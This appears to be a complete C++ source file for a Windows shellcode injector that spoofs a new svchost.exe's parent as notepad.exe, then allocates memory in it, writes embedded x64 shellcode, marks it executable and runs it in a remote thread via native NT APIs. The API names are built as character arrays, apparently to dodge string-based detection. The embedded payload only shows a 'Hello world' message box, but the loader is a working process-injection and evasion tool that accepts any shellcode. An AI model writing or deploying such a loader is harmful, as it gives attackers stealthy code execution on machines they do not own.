#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <TlHelp32.h>

#include "ntapi.h"
#include "ntstatus.h"

using namespace std;

unsigned char shellcode[] =
"\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

SIZE_T scSize = sizeof shellcode;

WCHAR strntdll[] = { 'n','t','d','l','l','.','d','l','l', 0x0 };

char strNtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strNtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strNtWaitForSingleObject[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0x0 };
char strNtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
char strRtlCreateUserThread[] = { 'R','t','l','C','r','e','a','t','e','U','s','e','r','T','h','r','e','a','d', 0x0 };
char strNtFreeVirtualMemory[] = { 'N','t','F','r','e','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };

FARPROC GetAPIAddress(char* NtApi) {
    
    FARPROC procAddress = GetProcAddress(GetModuleHandleW(strntdll), NtApi);
    if (procAddress == NULL) {
        return NULL;
    }

    return procAddress;
}

DWORD FindProcessId(wstring processName) {
    
    HANDLE snapshot = NULL;
    BOOL procFirst = FALSE;
    BOOL procNext = FALSE;

    DWORD processId = 0;

    // Process Entry structure and the size of the structure
    PROCESSENTRY32W procEntry{};
    procEntry.dwSize = sizeof(PROCESSENTRY32W); // size to fill the buffer
    
    // Snapshot of processes
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return EXIT_FAILURE;

    // Find first entry
    procFirst = Process32FirstW(snapshot, &procEntry);
    if (procFirst == FALSE) {
        CloseHandle(snapshot);
        return EXIT_FAILURE;
    }
    
    // Loop through all process and match target
    while (Process32NextW(snapshot, &procEntry)) {
        if (processName.compare(procEntry.szExeFile) == 0) {
            processId = procEntry.th32ProcessID;
        }
    }

    // Cleanup
    CloseHandle(snapshot);
    
    return processId;
}

DWORD SpoofPPID(DWORD processId) {
    
    // Init the structures
    STARTUPINFOEXW sie;
    PROCESS_INFORMATION pi;

    SIZE_T attributeSize = 0;

    std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

    // Clear out the structure so we can fill it in with the necessary info
    RtlSecureZeroMemory(&sie, sizeof(STARTUPINFOEXW));

    HANDLE spHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (spHandle == NULL) {
        cout << "[-] Failed obtaining a handle to target process" << endl;
        CloseHandle(spHandle);
        return NULL;
        exit(1);
    }
    cout << "[+] Handle to target process: [ " << spHandle << " ]" << endl;

    // Initialise the list of attributes for the process and thread 
    // Only for one attribute
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    // allocate memory for the attribute
    sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);

    // Now fill in the actual information we need to spoof ppid
    InitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &spHandle, sizeof(HANDLE), NULL, NULL);

    sie.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    // CREATE_SUSPENDED + EXTENDED_STARTUPINFO_PRESENT = 0x00080004
    BOOL pCreate = CreateProcessW(NULL, &pName[0], NULL, NULL, FALSE, (EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED), NULL, NULL, &sie.StartupInfo, &pi);
    if (pCreate == FALSE) {
        std::cout << "[-] Process couldn't be created" << std::endl;
        CloseHandle(spHandle);
        return NULL;
    }
  
    // Cleanup
    DeleteProcThreadAttributeList(sie.lpAttributeList);
    CloseHandle(spHandle);

    return pi.dwProcessId;
}

int main()
{
    DWORD processId = 0;
    DWORD spoofProcessId = 0;
    HANDLE spoofProcHandle = NULL;

    HANDLE hThread = NULL;
    
    processId = FindProcessId(L"notepad.exe");
    if (!processId) {
        cout << "[-] Can't find process" << endl;
        return EXIT_FAILURE;
    }
    cout << "[+] Target process ID : [" << processId << "] " << endl;

    spoofProcessId = SpoofPPID(processId);
    if (spoofProcessId != 0) {
        cout << "[+] Spoofed process with ID: [ " << spoofProcessId << " ]" << endl;
    }

    spoofProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, spoofProcessId);
    if (spoofProcHandle == NULL) {
        return EXIT_FAILURE;
    }
    cout << "[+] Spoofed process handle [ " << spoofProcHandle << " ]" << endl;

    

    PVOID BaseAddress = NULL;
    ULONG shellcodeSize = (ULONG)scSize;
    ULONG BytesWritten = 0;
    ULONG oldProtect = 0;

    sNtAllocateVirtualMemory fNtAllocationVirtualMemory = (sNtAllocateVirtualMemory)GetAPIAddress(strNtAllocateVirtualMemory);
    if (fNtAllocationVirtualMemory(spoofProcHandle, &BaseAddress, 0, (PULONG)&scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE) != STATUS_SUCCESS) {
        CloseHandle(spoofProcHandle);
        return EXIT_FAILURE;
    }

    cout << "[+] Allocated memory: [ " << BaseAddress << " ]" << endl;
    Sleep(1500);

    sNtWriteVirtualMemory fNtWriteVirtualMemory = (sNtWriteVirtualMemory)GetAPIAddress(strNtWriteVirtualMemory);
    if (fNtWriteVirtualMemory(spoofProcHandle, BaseAddress, shellcode, (ULONG)scSize, &BytesWritten) != STATUS_SUCCESS) {
        CloseHandle(spoofProcHandle);
        return EXIT_FAILURE;
    }

    sNtProtectVirtualMemory fNtProtectVirtualMemory = (sNtProtectVirtualMemory)GetAPIAddress(strNtProtectVirtualMemory);
    if (fNtProtectVirtualMemory(spoofProcHandle, &BaseAddress, (PULONG)&scSize, PAGE_EXECUTE_READ, &oldProtect) != STATUS_SUCCESS) {
        CloseHandle(spoofProcHandle);
        return EXIT_FAILURE;
    }

    sRtlCreateUserThread fRtlCreateUserThread = (sRtlCreateUserThread)GetAPIAddress(strRtlCreateUserThread);
    if (fRtlCreateUserThread(spoofProcHandle, NULL, FALSE, 0, 0, 0, BaseAddress, NULL, &hThread, NULL) != STATUS_SUCCESS) {
        CloseHandle(spoofProcHandle);
        return EXIT_FAILURE;
    }

    sNtWaitForSingleObject fNtWaitForSingleObject = (sNtWaitForSingleObject)GetAPIAddress(strNtWaitForSingleObject);
    if (fNtWaitForSingleObject(hThread, FALSE, NULL) != STATUS_SUCCESS) {
        CloseHandle(spoofProcHandle);
        return EXIT_FAILURE;
    }

    sNtFreeVirtualMemory fNtFreeVirtualMemory = (sNtFreeVirtualMemory)GetAPIAddress(strNtFreeVirtualMemory);
    fNtFreeVirtualMemory(spoofProcHandle, &BaseAddress, (PULONG)&scSize, MEM_DECOMMIT);
    
    CloseHandle(hThread);
    CloseHandle(spoofProcHandle);
    
    ExitProcess(EXIT_SUCCESS);
    return EXIT_SUCCESS;

}


